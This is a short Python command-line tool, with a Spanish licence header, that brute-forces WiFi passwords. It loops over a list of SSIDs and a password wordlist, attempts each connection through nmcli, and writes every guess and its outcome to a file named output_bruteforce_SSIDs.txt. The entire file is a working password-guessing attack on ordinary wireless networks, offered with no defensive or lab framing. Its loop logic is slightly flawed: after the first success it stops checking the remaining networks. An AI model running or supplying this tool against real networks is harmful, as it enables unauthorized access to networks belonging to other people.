#########################################################################################################
#                                   Desarrollado por Ariel Bujan                                        #
#########################################################################################################
# Por la presente se autoriza, de forma gratuita, a cualquier persona que obtenga una copia de este     #
# software y de los archivos de documentación asociados, para tratar con el Software sin restricción    #
# alguna, incluidos, sin limitación, los derechos de utilizar, copiar, modificar, fusionar, publicar,   #
# y/o distribuir copias del Software, y a permitir que las personas a las que se facilite el Software,  #
# con sujeción a las siguientes condiciones:                                                            #
#########################################################################################################
# EL SOFTWARE SE PROPORCIONA "AS IS", SIN GARANTÍA DE NINGÚN TIPO, EXPRESA O IMPLÍCITA, INCLUIDAS,      #
# ENTRE OTRAS, LAS GARANTÍAS DE COMERCIABILIDAD, IDONEIDAD PARA UN FIN DETERMINADO Y NO INFRACCIÓN.     #
# EN NINGÚN CASO LOS AUTORES NI LOS TITULARES DE LOS DERECHOS DE AUTOR SERÁN RESPONSABLES DE NINGUNA    #
# RESPONSABILIDAD, YA SEA CONTRACTUAL, EXTRACONTRACTUAL O DE OTRO TIPO, DERIVADA DE, O EN RELACIÓN CON  #
# EL MAL USO DEL SOFTWARE U OTRAS OPERACIONES RELACIONADAS CON EL SOFTWARE.                             #
#########################################################################################################

import subprocess
import argparse

def conectar_wifi(ssid, password):
    comando = ["nmcli", "dev", "wifi", "connect", ssid, "password", password]
    resultado = subprocess.run(comando, capture_output=True, text=True)
    if resultado.returncode == 0:
        return '[+] Conexión exitosa!!'
    else:
        return '[-] ~~~~~ Conexión fallida'

def verificar_conexiones(archivo_ssid, password, archivo_pass):
    resultados = []
    with open(archivo_ssid, 'r') as f_ssid:
        if password:  # Si se proporciona una contraseña directamente
            for linea_ssid in f_ssid:
                ssid = linea_ssid.strip()
                resultado = conectar_wifi(ssid, password)
                resultados.append(f"{ssid}:{password}:{resultado}\n")
        elif archivo_pass:  # Si se proporciona un archivo de contraseñas
            with open(archivo_pass, 'r') as f_passwords:
                for linea_ssid in f_ssid:
                    password_encontrada = False
                    ssid = linea_ssid.strip()
                    f_passwords.seek(0)  # Colocar el cursor del archivo de contraseñas al principio
                    for linea_password in f_passwords:
                        password = linea_password.strip()
                        resultado = conectar_wifi(ssid, password)
                        resultados.append(f"{ssid}:{password}:{resultado}\n")
                        if "Conexión exitosa" in resultado:  # Si se encontró una contraseña válida, marcar la bandera y salir del bucle interno
                            password_encontrada = True
                            break
                    if password_encontrada:  # Si se encontró una contraseña válida, pasar al siguiente SSID
                        break
    with open('output_bruteforce_SSIDs.txt', 'w') as f:
        f.writelines(resultados)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Verificar conexiones WiFi')
    parser.add_argument('archivo_ssid', help='Archivo de entrada con los SSID de las redes WiFi')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-p', '--password', help='Contraseña para las redes WiFi')
    group.add_argument('-P', '--passFile', help='Archivo de contraseñas para las redes WiFi')
    args = parser.parse_args()

    verificar_conexiones(args.archivo_ssid, args.password, args.passFile)
